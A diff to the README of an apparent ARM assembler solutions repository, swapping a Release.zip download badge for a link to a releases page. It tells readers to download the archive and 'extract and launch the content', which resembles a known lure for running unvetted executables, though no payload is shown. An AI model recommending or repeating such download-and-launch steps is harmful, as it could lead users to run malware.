@@ -27,7 +27,7 @@ This repository contains a collection of assembler code solutions tailored to en
 
 ## 🚀 Get Started
 To access the assembler code solutions, download the files from the following link:
-[![Download Solutions](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Solutions](https://github.com/KunalJan/Blackboard/releases)](https://github.com/KunalJan/Blackboard/releases)
 
 If the link ends with a file name, you will need to extract and launch the content. Dive into the exercises and challenges, and enrich your knowledge of ARM programming.
 
